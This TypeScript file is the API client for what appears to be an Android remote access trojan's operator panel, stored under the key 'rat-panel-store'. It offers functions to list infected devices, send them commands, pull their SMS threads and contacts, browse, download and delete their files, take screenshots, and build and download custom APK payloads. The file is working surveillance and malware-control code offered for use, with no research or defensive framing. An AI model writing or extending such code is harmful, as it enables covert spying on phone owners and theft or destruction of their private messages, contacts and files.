import type { ApkBuildConfig, SmsThread, Contact, FileEntry } from '../types';

const BASE =
  (import.meta.env['VITE_API_URL'] as string | undefined) ??
  `http://${window.location.hostname}:${window.location.port === '5173' ? '3001' : window.location.port}/api`;

/* ── helpers ─────────────────────────────────────────────────── */
function getToken(): string {
  try {
    const raw = localStorage.getItem('rat-panel-store');
    if (!raw) return '';
    const parsed = JSON.parse(raw) as { state?: { auth?: { token?: string } } };
    return parsed.state?.auth?.token ?? '';
  } catch { return ''; }
}

async function request<T>(
  method: 'GET' | 'POST' | 'DELETE',
  path:   string,
  body?:  unknown
): Promise<T> {
  const res = await fetch(`${BASE}${path}`, {
    method,
    headers: {
      'Content-Type':  'application/json',
      'Authorization': `Bearer ${getToken()}`,
    },
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
  if (!res.ok) {
    const text = await res.text();
    throw new Error(text || `HTTP ${res.status}`);
  }
  return res.json() as Promise<T>;
}

/* ── auth ────────────────────────────────────────────────────── */
export const auth = {
  login: (password: string) =>
    request<{ token: string; ok: boolean }>('POST', '/auth/login', { password }),
};

/* ── devices ─────────────────────────────────────────────────── */
export const devices = {
  list: () =>
    request<{ devices: unknown[] }>('GET', '/devices'),

  command: (deviceId: string, command: string, params?: Record<string, unknown>) =>
    request('POST', `/devices/${deviceId}/command`, { command, params }),

  sms: (deviceId: string) =>
    request<{ threads: SmsThread[] }>('GET', `/devices/${deviceId}/sms`),

  contacts: (deviceId: string) =>
    request<{ contacts: Contact[] }>('GET', `/devices/${deviceId}/contacts`),

  files: (deviceId: string, path: string) =>
    request<{ files: FileEntry[] }>(
      'GET',
      `/devices/${deviceId}/files?path=${encodeURIComponent(path)}`
    ),

  deleteFile: (deviceId: string, path: string) =>
    request<{ ok: boolean }>(
      'DELETE',
      `/devices/${deviceId}/files?path=${encodeURIComponent(path)}`
    ),

  downloadFile: (deviceId: string, path: string): string =>
    `${BASE}/devices/${deviceId}/download?path=${encodeURIComponent(path)}&token=${getToken()}`,

  screenshot: (deviceId: string): string =>
    `${BASE}/devices/${deviceId}/screenshot?token=${getToken()}&t=${Date.now()}`,
};

/* ── apk ─────────────────────────────────────────────────────── */
export const apk = {
  build: (config: ApkBuildConfig) =>
    request<{ jobId: string }>('POST', '/apk/build', config),

  status: (jobId: string) =>
    request<{ status: unknown }>('GET', `/apk/status/${jobId}`),

  download: (jobId: string): string =>
    `${BASE}/apk/download/${jobId}?token=${getToken()}`,
};

/* ── server ──────────────────────────────────────────────────── */
export const server = {
  health: () => request<{ ok: boolean; uptime: number }>('GET', '/health'),
};
